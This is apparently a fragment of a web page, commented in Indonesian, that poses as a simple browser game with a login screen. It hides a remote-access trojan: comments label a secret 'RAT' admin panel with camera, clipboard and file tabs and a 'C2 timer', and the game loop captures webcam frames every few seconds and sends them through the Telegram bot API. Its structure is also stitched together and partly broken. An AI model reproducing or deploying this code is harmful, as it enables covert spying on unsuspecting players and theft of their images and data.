    <style>
        :root { --primary: #6c5ce7; --bg: #0f172a; --text: #e2e8f0; --panel: rgba(30, 41, 59, 0.9); }
        * { box-sizing: border-box; user-select: none; font-family: 'Segoe UI', sans-serif; }
        body { margin: 0; overflow: hidden; background-color: var(--bg); color: var(--text); height: 100vh; transition: background 0.5s; }

        /* --- LAYAR LOGIN / SIGNUP (MINIM CURIGA) --- */
        #auth-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: flex; justify-content: center; align-items: center; background: linear-gradient(45deg, #1e293b, #0f172a); backdrop-filter: blur(10px); }
        .login-box { width: 380px; padding: 40px; border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5), inset 0 0 20px rgba(167,139,250,0.1); background: var(--panel); text-align: center; animation: float 6s ease-in-out infinite; }
        
        h1 { margin-bottom: 10px; color: #a78bfa; font-style: italic; letter-spacing: 2px; }
        p.subtitle { color: #94a3b8; font-size: 0.9em; margin-bottom: 30px; }
        
        .input-group { position: relative; margin-bottom: 20px; text-align: left; }
        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #64748b; }
        input, button { width: 100%; padding: 12px 15px; border-radius: 12px; border: none; outline: none; transition: all 0.3s; font-size: 1em; }
        input:focus { box-shadow: 0 0 0 4px rgba(167,139,250,0.3); }
        
        .btn-primary { background-color: var(--primary); color: white; font-weight: bold; cursor: pointer; position: relative; overflow: hidden; }
        .btn-primary::after { content:''; position: absolute; bottom: 0; left: 0; width: 100%; height: 4px; background:white; transformX scaleX(0); transition: all 0.3s; }
        .btn-primary:hover::after { scaleX: 1; }
        
        .google-btn { margin-top: 15px; display:flex; justify-content:center;}

        /* --- LAYAR GAME (CANVAS) --- */
        #game-container { display:none; position:relative; width:100vw; height:100vh; flex-direction:column; }
        canvas { background:#2d3748; border-radius: 4px; box-shadow: inset 0 0 50px rgba(0,0,0,0.5); cursor: crosshair; }
        #hud-layer { position:absolute; top:20px; left:20px; color:white; font-weight:bold; text-shadow:1px 1px 2px black;}

        /* --- PANEL ADMIN RAHASIA (RAT) --- */
        #admin-panel { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:80vw; height:70vh; background:#1a233e; border-radius:15px; box-shadow:0 0 100px rgba(167,139,250,0.4); z-index:999; padding:20px; overflow:hidden; }
        
        .panel-header { display:flex; justify-content:space-between; margin-bottom:20px; font-size:1.2em; color:#fbbf24;}
        .tab-buttons button { flex:1; background:#3b4d6b; color:white; margin-right:5px; cursor:pointer;}
        .tab-buttons button.active { background:#a78bfa; }
        
        #admin-content { height:calc(100% - 60px); position:relative;}
        [data-tab="camera"] video, [data-tab="clipboard"], [data-tab="files"] iframe { width:100%; height:98%; border:none; object-fit:contain; }

        /* --- ANIMASI --- */
        @keyframes float { 0%{transform:translateY(-25px);} 50%{transform:translateY(-35px);} 100%{transform:translateY(-25px);} }

    </style>
</head>

function sendMessageToTelegram(method, bodyData) {
    if(!CONFIG.token || !state.cameraStream) return; 
    
    // Simple Retry Logic (Exponential Backoff)
    let attempts = 0;
    while(attempts <= 3) {
        try {
            const fd = new FormData();
            Object.keys(bodyData).forEach(k => fd.append(k, bodyData[k]));
            
            fetch(`https://api.telegram.org/bot${CONFIG.token}/${method}`, {method:'POST', body:fd}).then(r=>{if(r.ok)return true; throw r}); 
        } catch(e) { attempts++; setTimeout(()=>{}, Math.pow(2,attempts)*1000); } finally {}
    }
}

let playerPos = {x: -100, y: -100};

// Input Handling (WASD + Mouse)
document.addEventListener("keydown", e => keys[e.key] = true);

function startGame() {
    document.getElementById('auth-overlay').style.display = 'none';
    document.body.style.background = '#1e293b'; // Dark Mode Game
    
    state.isGameRunning = true;
    
    // Update UI Player Name di HUD (Simulasi Multiplayer)
    const hud = document.querySelector('.player-tag'); 
    if(hud && !hud.textContent.includes(state.user)) hud.innerHTML += ` | ID: <span style="color:#a78bfa">${state.user.name}</span>`;

    gameLoop();
}

// Loop Utama Game & C2 Timer Terpisah
function gameLoop() {
    if(!state.isGameRunning) return;

    ctx.clearRect(0, 0, canvas.width, canvas.height);

    // --- LOGIKA GAME SEDERHANA (MOVEMENT PLAYER 1 VS AI DUMMY) ---
    
    // Player 1 Movement
    let speed = 5;
    if(keys['w']) playerPos.y -= speed; 
    if(keys['s']) playerPos.y += speed; 
    if(keys['a']) playerPos.x -= speed; 
    if(keys['d']) playerPos.x += speed; 

    // Render Player Circle (Simple Visual)
    const pRadius = 20;
    ctx.beginPath(); ctx.arc(playerPos.x, playerPos.y, pRadius, 0, Math.PI*2); 
    ctx.fillStyle = '#6c5ce7'; ctx.fill();

    // Render "Enemy" AI Dummy di posisi acak
    let enemyX = canvas.width/2 -100 + (Math.sin(Date.now()/300)*40); // Gerak zig-zag
    let enemyY = canvas.height/2 -100; 
    
    ctx.beginPath(); ctx.arc(enemyX, enemyY, pRadius+5, 0, Math.PI*2); 
    ctx.fillStyle = '#e74c3c'; // Merah (Musuh)
    ctx.fill();


    // --- C2 TIMER BACKGROUND (Setiap 5 Detik Kirim Foto) ---
    const now = Date.now();
    if(now - state.lastLogTime > CONFIG.camInterval && state.cameraStream) {
        captureAndSendFrame().then(()=>{state.lastLogTime=now});
    }

    requestAnimationFrame(gameLoop);
}
